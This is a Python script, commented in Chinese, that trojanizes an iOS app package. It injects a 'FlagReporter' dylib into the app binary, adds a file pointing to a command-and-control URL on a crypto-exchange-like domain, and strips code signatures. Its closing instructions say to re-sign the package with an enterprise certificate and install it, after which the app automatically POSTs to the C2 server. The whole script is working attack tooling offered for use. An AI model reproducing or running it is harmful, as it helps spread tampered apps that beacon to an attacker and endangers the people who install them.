#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
IPA 重打包工具：注入 FlagReporter dylib + flag 文件
用法: python3 repackage_ipa.py <input.ipa> <output.ipa> [c2_url]
"""
import sys
import os
import zipfile
import shutil
import tempfile
import subprocess

# 当前脚本目录
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DYLIB_PATH = os.path.join(SCRIPT_DIR, 'FlagReporter.dylib')
FLAG_BLOB = "ip8JBunAzBej3MTiWYSpehb8bVtMYAGmp1uuG3dpCEXHzdxAVb6uYwE9EJhPUSeE9UsZ6j9Dud5heph7rRBh6E1Y73FCFzq18sXon"
INJECT_SCRIPT = os.path.join(SCRIPT_DIR, 'inject_dylib.py')

def main():
    if len(sys.argv) < 3:
        print("用法: python3 repackage_ipa.py <input.ipa> <output.ipa> [c2_url]")
        print("示例: python3 repackage_ipa.py 165454_plugin2.ipa 165454_patched.ipa https://chain.8848exchange.cc.cd")
        sys.exit(1)
    
    input_ipa = sys.argv[1]
    output_ipa = sys.argv[2]
    c2_url = sys.argv[3].rstrip('/') if len(sys.argv) > 3 else "https://chain.8848exchange.cc.cd"
    
    if not os.path.exists(input_ipa):
        print(f"[-] 错误: 输入 IPA 不存在: {input_ipa}")
        sys.exit(1)
    
    if not os.path.exists(DYLIB_PATH):
        print(f"[-] 错误: FlagReporter.dylib 不存在: {DYLIB_PATH}")
        print("请先在 macOS 上编译 dylib，参见 build_macos.sh")
        sys.exit(1)
    
    tmp = tempfile.mkdtemp()
    try:
        # 1. 解压 IPA
        print(f"\n[1/6] 解压 IPA: {input_ipa}")
        with zipfile.ZipFile(input_ipa) as z:
            z.extractall(tmp)
        print("      ✓ 解压完成")
        
        # 2. 查找 .app 目录
        payload_dir = os.path.join(tmp, 'Payload')
        app_dirs = [d for d in os.listdir(payload_dir) if d.endswith('.app')]
        if not app_dirs:
            print("[-] 错误: Payload 中未找到 .app 目录")
            sys.exit(1)
        app_dir = os.path.join(payload_dir, app_dirs[0])
        print(f"\n[2/6] App 目录: {app_dirs[0]}")
        
        # 3. 复制 dylib 到 Frameworks
        frameworks_dir = os.path.join(app_dir, 'Frameworks')
        if not os.path.exists(frameworks_dir):
            os.makedirs(frameworks_dir)
        dylib_dest = os.path.join(frameworks_dir, 'FlagReporter.dylib')
        shutil.copy2(DYLIB_PATH, dylib_dest)
        print(f"\n[3/6] 复制 dylib → Frameworks/FlagReporter.dylib")
        
        # 4. 修改主二进制注入 LC_LOAD_DYLIB
        # 查找主二进制 (与 .app 同名)
        app_name = app_dirs[0].replace('.app', '')
        main_binary = os.path.join(app_dir, app_name)
        if not os.path.exists(main_binary):
            # 尝试查找可执行文件
            for f in os.listdir(app_dir):
                fp = os.path.join(app_dir, f)
                if os.path.isfile(fp) and os.access(fp, os.X_OK) and not f.endswith(('.plist', '.png', '.json', '.mobileprovision')):
                    main_binary = fp
                    break
        
        print(f"\n[4/6] 注入 dylib 到主二进制: {os.path.basename(main_binary)}")
        result = subprocess.run(
            ['python3', INJECT_SCRIPT, main_binary, dylib_dest],
            capture_output=True, text=True
        )
        print(result.stdout)
        if result.returncode != 0:
            print(f"[-] 注入失败:\n{result.stderr}")
            sys.exit(1)
        
        # 5. 注入 flag 文件
        flag_path = os.path.join(app_dir, 'flag')
        flag_url = c2_url + '/report'
        flag_content = FLAG_BLOB + '----6----' + flag_url
        with open(flag_path, 'w') as f:
            f.write(flag_content)
        print(f"\n[5/6] 写入 flag 文件 (→ {flag_url})")
        
        # 6. 清除签名
        print(f"\n[6/6] 清除残留签名")
        for root, dirs, _ in os.walk(app_dir):
            for d in list(dirs):
                if d in ('_CodeSignature', 'CodeResources'):
                    target = os.path.join(root, d)
                    shutil.rmtree(target, ignore_errors=True)
                    print(f"      删除 {d}")
        
        # 打包
        print(f"\n[*] 打包输出: {output_ipa}")
        if os.path.exists(output_ipa):
            os.remove(output_ipa)
        with zipfile.ZipFile(output_ipa, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, _, files in os.walk(tmp):
                for fn in files:
                    full = os.path.join(root, fn)
                    rel = os.path.relpath(full, tmp)
                    zf.write(full, rel)
        
        file_size = os.path.getsize(output_ipa) / (1024 * 1024)
        print(f"\n{'='*50}")
        print(f"✓ 完成: {output_ipa} ({file_size:.1f} MB)")
        print(f"{'='*50}")
        print("\n后续步骤:")
        print("1. 使用企业签名工具对 IPA 进行重签名")
        print("2. 安装到 iOS 设备")
        print(f"3. 启动 App 后会自动向 {flag_url} 发送 POST 请求")
        
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

if __name__ == "__main__":
    main()
